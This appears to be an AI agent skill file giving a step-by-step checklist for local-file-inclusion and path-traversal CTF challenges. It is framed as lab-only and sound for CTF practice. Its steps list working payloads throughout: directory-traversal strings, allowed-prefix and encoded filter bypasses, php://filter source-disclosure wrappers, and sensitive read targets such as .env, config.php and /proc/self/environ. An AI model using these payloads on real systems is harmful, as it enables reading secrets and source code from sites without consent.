---
name: web-ctf-lfi
description: Use for Web CTF LFI/path traversal/file include/file read challenges, especially when the page hints at allowed paths, approved paths, include directories, template directories, upload directories, or other constrained file paths.
---

# Web CTF LFI Checklist

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

## Trigger Signals

Use this skill when the challenge shows signs such as:

- LFI / local file inclusion / file include / include / require
- File read / path traversal / directory traversal
- View / template / page / module / include parameter
- Approved Paths / allowed path / allowed directory
- Include directory / template directory / upload directory
- Static directory / image / file / page / view / template directory
- `/etc/passwd`
- `Illegal path specified` / `not allowed` / `forbidden path` / `blocked path`

## Core Principle

**Legitimate directory prefix + path traversal** is the key model.

Many CTF filters check whether the raw input begins with an approved string, for example:

- `./{dir}/`
- `{dir}/`
- `/var/www/html/{dir}/`
- `templates/`
- `uploads/`
- `pages/`
- `views/`
- `static/`
- `files/`

When a page hints at an allowed directory, extract that directory dynamically as `{dir}` and test prefix traversal.

Do **not** hardcode a specific parameter name or directory name.

## Step 1: Find Controllable Inputs

Check:
- URL query parameters
- Path segments
- Form fields
- Cookies
- Headers (only if hinted)
- Links and hidden fields
- JavaScript-generated requests
- Server error messages

Common file-like parameter names (test only what the page exposes):
`file`, `path`, `page`, `view`, `template`, `include`, `module`, `route`, `name`, `doc`, `document`, `download`, `read`, `source`, `src`, `target`, `next`, `url`, `lang`, `language`, `locale`

## Step 2: Baseline Tests

For each likely input, test safe baseline values first:
`index`, `home`, `default`, `main`, `test`, `readme`, or existing values from links/forms/source.

Record: status, response length, markers.

## Step 3: Basic LFI Tests

```
../../../../etc/passwd
../../../etc/passwd
../../etc/passwd
../etc/passwd
/etc/passwd
../../../../flag
../../../../flag.txt
../../../../var/www/html/index.php
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

Key markers:
- `root:x:0:0` → /etc/passwd read successful
- `flag{` → flag found
- `Illegal path specified` / `not allowed` / `failed to open stream` / `No such file` → blocked or missing

## Step 4: Approved/Allowed Directory Prefix Bypass

If the page hints at any allowed directory, extract it as `{dir}`.

For each discovered `{dir}`, test:

```
./{dir}/../../../../etc/passwd
{dir}/../../../../etc/passwd
/{dir}/../../../../etc/passwd
./{dir}/../../../etc/passwd
{dir}/../../../etc/passwd
./{dir}/../../etc/passwd
{dir}/../../etc/passwd
./{dir}/../index.php
{dir}/../index.php
./{dir}/../../../../var/www/html/index.php
{dir}/../../../../var/www/html/index.php
./{dir}/../../../../flag
{dir}/../../../../flag
./{dir}/../../../../flag.txt
{dir}/../../../../flag.txt
```

**Critical**: Do not only test `{dir}/../../...`. Always also test `./{dir}/../../...`. Some applications require the literal prefix `./{dir}/`. The leading `./` may be the difference between blocked and successful.

## Step 5: Filter Bypass

If blocked, test:

```
....//....//....//etc/passwd
..././..././..././etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini
```

Also try:
- URL encoding
- Double URL encoding
- Mixed separators
- Repeated slashes
- Current-directory prefixes `./`
- Allowed-prefix traversal after encoding

Do **not** rely on null byte injection on modern PHP (5.3.4+), but remember it for old PHP targets.

## Step 6: File Targets

If file read works, prioritize:

```
/etc/passwd
/flag
/flag.txt
/flag.php
/proc/self/environ
/proc/self/cmdline
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/log/apache2/access.log
/var/log/nginx/access.log
/tmp/sess_{SESSION_ID}
```

If PHP source is needed, prefer:
```
php://filter/convert.base64-encode/resource=<target>
```

## Step 7: Stop Condition

Stop when a valid flag is found.

Return:
- Successful payload
- Exact URL / request
- Extracted flag
- Short explanation
